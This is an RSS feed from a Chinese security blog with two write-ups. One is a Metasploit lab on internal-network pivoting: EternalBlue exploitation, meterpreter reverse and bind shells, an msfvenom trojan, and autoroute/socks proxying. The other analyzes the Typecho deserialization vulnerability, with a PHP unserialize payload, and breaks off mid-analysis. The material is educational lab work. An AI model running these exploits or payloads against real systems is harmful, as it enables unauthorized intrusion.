<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>爆肚的杂货铺</title>
    <link>https://b40du.github.io/</link>
    <description>Recent content on 爆肚的杂货铺</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>This is a customized copyright.</copyright>
    <lastBuildDate>Tue, 14 Jul 2020 01:25:33 +0800</lastBuildDate>
    
        <atom:link href="https://b40du.github.io/index.xml" rel="self" type="application/rss+xml" />
    
    
    
        <item>
        <title>利用MSF进行三层内网靶场渗透（基础篇）</title>
        <link>https://b40du.github.io/posts/writeup-chaitin-intranet-penetration-01/</link>
        <pubDate>Tue, 14 Jul 2020 01:25:33 +0800</pubDate>
        
        <guid>https://b40du.github.io/posts/writeup-chaitin-intranet-penetration-01/</guid>
        <description>爆肚的杂货铺 https://b40du.github.io/posts/writeup-chaitin-intranet-penetration-01/ -&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;基础篇&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;虚拟机 Kali 攻击机 + Windows 内外网机器&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;进阶篇&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;公网 vps 攻击机 + Windows 内外网机器&lt;/li&gt;
&lt;li&gt;公网 vps 攻击机 + Linux 外网机器 + Windows内网机器&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;高阶篇&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;公网 vps 攻击机 + Linux 外网机器（内网Linux服务器映射） + Linux内网服务器 + Windows内网机器&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;1-环境搭建&#34;&gt;1. 环境搭建&lt;/h1&gt;
&lt;h2 id=&#34;11-主机信息&#34;&gt;1.1 主机信息&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Kali Linux 攻击机&lt;/li&gt;
&lt;li&gt;Windows 7 x1（内外网-双网卡）&lt;/li&gt;
&lt;li&gt;Windows 7 x2（内网-双网卡）&lt;/li&gt;
&lt;li&gt;Windows 7 x3（内网-单网卡）&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;12-网络拓扑&#34;&gt;1.2 网络拓扑&lt;/h2&gt;
&lt;p&gt;一开始的打算是按照如下拓扑进行实验：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200714023707.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;多次搭建后频频卡住，遂改变思路，先完成最简单的实验：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200714024308.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;13-环境配置&#34;&gt;1.3 环境配置&lt;/h2&gt;
&lt;p&gt;手动开启永恒之蓝漏洞。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;C:%5CNutstore%5C999-%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87%5Cimage-20200713231523624.png&#34; alt=&#34;image-20200713231523624&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;C:%5CNutstore%5C999-%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87%5Cimage-20200713231532544.png&#34; alt=&#34;image-20200713231532544&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;C:%5CNutstore%5C999-%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87%5Cimage-20200713231542237.png&#34; alt=&#34;image-20200713231542237&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;2-攻击实施&#34;&gt;2. 攻击实施&lt;/h1&gt;
&lt;p&gt;先说一下大体的攻击流程：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Kali攻击机通过Web攻击获取内网Web服务器&lt;code&gt;192.168.80.110&lt;/code&gt;的WebShell（在这里假设我们已经获取第一层靶机的shell）&lt;/li&gt;
&lt;li&gt;扫描内网横向渗透&lt;/li&gt;
&lt;li&gt;打入内网&lt;code&gt;172.1.1.112&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;打入内网&lt;code&gt;10.1.1.112&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;首先我们打开&lt;code&gt;msf&lt;/code&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;msfconsole
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200714010030.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;由于假设已经获取了接通外网机器的权限，我们直接使用&lt;code&gt;metesploit&lt;/code&gt;利用&lt;code&gt;MS17-010&lt;/code&gt;模块攻击，成功获得shell。&lt;/p&gt;
&lt;p&gt;查找&lt;code&gt;ms17-010&lt;/code&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;msf5 &amp;gt; search ms17-010
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200714040414.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.80.110
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.80.128
exploit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200714010155.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;meterpreter &amp;gt; ipconfig
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;发现存在内网IP。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200714012455.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么我们尝试扫描&lt;code&gt;ARP&lt;/code&gt;表，发现了内网中的其他主机：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;run arp_scanner -r 172.1.1.0/24
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200714012727.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;既然存在内网，访问其他主机，我们可以利用MSF自带的&lt;code&gt;autoroute&lt;/code&gt;功能添加路由：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;run autoroute -h
run autoroute -s 172.1.1.0/24
run autoroute -p
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200714013051.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;autoroute&lt;/code&gt;添加路由后，MSF可以访问172.1.1.0/24网段的主机，但此时MSF仅能访问内网主机，无法访问内网主机的&lt;code&gt;web&lt;/code&gt;服务，然后我们&lt;code&gt;background&lt;/code&gt;挂起：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;meterpreter &amp;gt; background
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200714013555.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;利用MSF设置&lt;code&gt;socks4&lt;/code&gt;代理：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;use auxiliary/server/socks4a
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200714023323.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;成功，然后我们修改&lt;code&gt;proxychains&lt;/code&gt;配置文件：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;sudo vim /etc/proxychains.conf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200714023506.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;为了显示效果，特地在第二台靶机上搭建了一个DVWA。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200714025215.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们通过代理使用&lt;code&gt;curl&lt;/code&gt;访问一下靶机上的&lt;code&gt;DVWA&lt;/code&gt;，并成功返回页面信息。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200714025034.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后我们生成一个&lt;code&gt;1.exe&lt;/code&gt;的木马文件，我们可以通过代理的方式将该木马文件传至&lt;code&gt;172.1.1.112&lt;/code&gt;主机上（也可以通过生成大小马的方式，代理访问&lt;code&gt;DVWA&lt;/code&gt;上传木马，再次获得&lt;code&gt;172.1.1.112&lt;/code&gt;主机的权限）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;msfvenom -p windows/meterpreter/bind_tcp  lport&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1080&lt;/span&gt; -f exe -o 1.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200714040752.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200714043015.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;当目标运行木马以后，然后我们通过代理再次开启&lt;code&gt;msf&lt;/code&gt;：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200714025824.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们依旧通过&lt;code&gt;msf&lt;/code&gt;打进去：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;use exploit/multi/handler
set RHOSTS 172.1.1.112
set payload windows/x64/meterpreter/reverse_tcp
set lhost 172.1.1.111
run
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当然，下图是继续通过永恒之蓝打进去的效果。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200714042149.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;由于&lt;code&gt;1.exe&lt;/code&gt;不能成功运行，后续实验没有再继续，永恒之蓝使用过一次了，没有继续使用，后续的实验和前面的大同小异。&lt;/p&gt;
&lt;p&gt;因为多级内网代理和单层内网代理本质是一样的。比如通过第一台机器又拿到了内网的第二台机器的&lt;code&gt;meterpreter&lt;/code&gt;，但你发现在第二台&lt;code&gt;meterpreter&lt;/code&gt;上还存在另一个内网，你只需要再在这个&lt;code&gt;meterpreter&lt;/code&gt;上添加一层到那个网段的路由，不断套娃，理论上就可以把目标的所有内网段都翻一遍，但是有个问题，代理多了，是非常慢的。&lt;/p&gt;
&lt;p&gt;至于攻击下一台机器的部分，并不是每台机器都是&lt;code&gt;web&lt;/code&gt;服务器，需要重新进行信息收集，把内网的机器收集个遍。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;总体感觉今天的实验是失败的，因为设想的实验没有完成，虽然只是多了一层Web服务器的端口映射，但是感觉这部分内容是非常有必要的，后续有时间进行补充。&lt;/p&gt;
&lt;/blockquote&gt;
- https://b40du.github.io/posts/writeup-chaitin-intranet-penetration-01/ - This is a customized copyright.</description>
        </item>
    
    
    
        <item>
        <title>Typecho反序列化漏洞</title>
        <link>https://b40du.github.io/posts/writeup-chaitin-deserialization-01/</link>
        <pubDate>Fri, 10 Jul 2020 23:10:01 +0800</pubDate>
        
        <guid>https://b40du.github.io/posts/writeup-chaitin-deserialization-01/</guid>
        <description>爆肚的杂货铺 https://b40du.github.io/posts/writeup-chaitin-deserialization-01/ -&lt;h1 id=&#34;1-前置知识&#34;&gt;1. 前置知识&lt;/h1&gt;
&lt;h2 id=&#34;11-什么是反序列化&#34;&gt;1.1 什么是反序列化？&lt;/h2&gt;
&lt;p&gt;序列化：将对象变成可以传输的字符串（&lt;code&gt;Json&lt;/code&gt;格式便是一种序列化）&lt;/p&gt;
&lt;p&gt;反序列化：将可以传输的字符串再变成对象&lt;/p&gt;
&lt;h2 id=&#34;12-为何造成漏洞产生&#34;&gt;1.2 为何造成漏洞产生？&lt;/h2&gt;
&lt;p&gt;漏洞产生的原因主要是因为PHP语言自带的魔术方法，魔术方法一般是由&lt;code&gt;__&lt;/code&gt;开头，在某些条件下可以自动调用，而不需要我们手工调用。&lt;/p&gt;
&lt;p&gt;如果是学习过C++的同学应该理解，如果我们创建一个空的类，它本身会默认产生如下几个类成员函数：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-C++&#34; data-lang=&#34;C++&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;A&lt;/span&gt;
{
	&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;缺省构造函数&lt;/span&gt;
	&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;缺省拷贝构造函数&lt;/span&gt;
	&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;缺省析构函数&lt;/span&gt;
	&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;缺省赋值运算符&lt;/span&gt;
	&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;缺省取址运算符&lt;/span&gt;
	&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;缺省取址运算符&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;。&lt;/span&gt; 
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;那么在类创建对象的时候，构造函数会首先执行，在我们销毁对象的时候，析构函数会最后执行，而构造函数和析构函数执行的时候，并不需要我们手动操作。&lt;/p&gt;
&lt;p&gt;那么PHP语言自带的魔术方法，也是类似的情况，在创建/销毁对象以及其他若干操作的时候，会自动调用某些魔术方法。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;一般情况下如下魔术方法是我们特别需要警惕的：&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;方法&lt;/th&gt;
&lt;th&gt;调用条件&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;__wakeup()&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;使用&lt;code&gt;unserialize()&lt;/code&gt;时调用&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;__sleep()&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;使用&lt;code&gt;serialize()&lt;/code&gt;时调用&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;__construct()&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;当对象创建时会自动调用（单在&lt;code&gt;unserialize()&lt;/code&gt;时是不会自动调用的）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;__destruct()&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;当对象被销毁时会自动调用&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;__call()&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;在对象上下文中调用不可访问的方法时调用&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;__callStatic()&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;在静态上下文中调用不可访问的方法时调用&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;__get()&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;用于从不可访问的属性读取数据，在对象上下文中调用不可访问的方法时触发&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;__set()&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;用于将数据写入不可访问的属性&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;__isset()&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;在不可访问的属性上调用&lt;code&gt;isset()&lt;/code&gt;或&lt;code&gt;empty()&lt;/code&gt;触发&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;__unset()&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;在不可访问的属性上使用&lt;code&gt;unset()&lt;/code&gt;时触发&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;__toString()&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;__invoke()&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;当脚本尝试将对象调用为函数时触发&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;如果服务器能够接收我们反序列化过的字符串，并且未经过滤，直接把字符串中的变量交给魔术方法自动执行，就很有可能产生意想不到的问题以及漏洞。&lt;/p&gt;
&lt;h2 id=&#34;13-举个小例子&#34;&gt;1.3 举个小例子&lt;/h2&gt;
&lt;p&gt;我们构造一个简单的小案例：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;A&lt;/span&gt; {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; $test &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;demo&amp;#34;&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __destruct(){
    	&lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;;
    }
}
$a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;];
$a_unser &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;unserialize&lt;/span&gt;($a);
&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;这个时候如果我们构造了如下&lt;code&gt;poc&lt;/code&gt;：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;A&lt;/span&gt;{
    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; $test;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; $hello;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __construct($test, $hello){
        $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $test;
        $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;hello&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $hello;
    }
}
$demo &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;A&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hello&amp;#39;&lt;/span&gt;);
&lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;serialize&lt;/span&gt;($demo)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;产生了这样一串&lt;code&gt;payload&lt;/code&gt;：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;O:1:&amp;quot;A&amp;quot;:1:{s:4:&amp;quot;test&amp;quot;;s:5:&amp;quot;hello&amp;quot;;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们在&lt;code&gt;url&lt;/code&gt;栏中输入&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://ip地址/test.php?test=O:1:&amp;quot;A&amp;quot;:1:{s:4:&amp;quot;test&amp;quot;;s:5:&amp;quot;hello&amp;quot;;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;就能控制原代码&lt;code&gt;echo&lt;/code&gt;出来的变量，同时，我们也可以修改为恶意代码。&lt;/p&gt;
&lt;h1 id=&#34;2-漏洞成因&#34;&gt;2. 漏洞成因&lt;/h1&gt;
&lt;p&gt;该漏洞发生在&lt;code&gt;install.php&lt;/code&gt;文件中，在函数&lt;code&gt;unserialize()&lt;/code&gt;的参数&lt;code&gt; __typecho_config&lt;/code&gt;中我们可以构造的恶意代码，让程序进行一系列的操作，最后由&lt;code&gt;call_user_func()&lt;/code&gt;函数或者是&lt;code&gt;array_map()&lt;/code&gt;函数实现任意代码执行。&lt;/p&gt;
&lt;h1 id=&#34;3-漏洞分析&#34;&gt;3. 漏洞分析&lt;/h1&gt;
&lt;p&gt;一上来拿到站点是比较懵逼的，除了首页所有的页面都不能点，搜索直接报错。&lt;/p&gt;
&lt;p&gt;那我们直接上扫描器，看看这个站点的敏感目录，发现&lt;code&gt;install.php&lt;/code&gt;暴露在外，但是无法读取。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200711194046.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们还是下载源码，对源码进行审计，看看反序列化漏洞的点在哪里。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Typecho源码下载地址：https://github.com/typecho/typecho/releases/tag/v1.1-15.5.12-beta&lt;/p&gt;
&lt;p&gt;该漏洞生效版本为：v1.1-15.5.12-beta以及之前的版本&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;下载以后我们打开查看文件，并重点筛选那些魔术方法，找到如下文件：&lt;/p&gt;
&lt;h2 id=&#34;31-installphp-文件&#34;&gt;3.1 install.php 文件&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200710220216.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;如上图所示，我们发现，&lt;code&gt;$config&lt;/code&gt;变量是由&lt;code&gt;unserialize&lt;/code&gt;函数生成的，传入的参数是&lt;code&gt;__typecho_config&lt;/code&gt;，这个参数是可以被我们控制的&lt;code&gt;cookie&lt;/code&gt;值。&lt;/p&gt;
&lt;p&gt;然后程序会创建一个&lt;code&gt;Typecho_Db&lt;/code&gt;的实例化对象，参数就是刚刚生成的&lt;code&gt;$config&lt;/code&gt;变量。&lt;/p&gt;
&lt;h2 id=&#34;32-dbphp-文件&#34;&gt;3.2 Db.php 文件&lt;/h2&gt;
&lt;p&gt;然后我们追踪到&lt;code&gt;Typecho_Db&lt;/code&gt;类，在&lt;code&gt;Db.php&lt;/code&gt;文件中。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200710220700.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;构造函数会将传入的实参&lt;code&gt;$config[&#39;adapter&#39;]&lt;/code&gt;，也就是形参&lt;code&gt;$adapterName&lt;/code&gt;进行字符串拼接，如果&lt;code&gt;$adapterName&lt;/code&gt;是一个类的实例化对象，在对其进行字符串拼接的过程中，会触发魔术方法&lt;code&gt;__toSring()&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;33-feedphp-文件&#34;&gt;3.3 Feed.php 文件&lt;/h2&gt;
&lt;p&gt;在&lt;code&gt;Feed.php&lt;/code&gt;文件中，有&lt;code&gt;__toString()&lt;/code&gt;魔术方法，而在这个方法内，我们可以搜索到&lt;code&gt;screenName&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200710220950.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;这里代码的作用是访问&lt;code&gt;$item[&#39;author&#39;]&lt;/code&gt;中的&lt;code&gt;screenName&lt;/code&gt;对象。&lt;/p&gt;
&lt;p&gt;而&lt;code&gt;$item&lt;/code&gt;呢，是使用&lt;code&gt;foreach&lt;/code&gt;对&lt;code&gt;$this-&amp;gt;_items&lt;/code&gt;数组进行遍历而产生的。&lt;/p&gt;
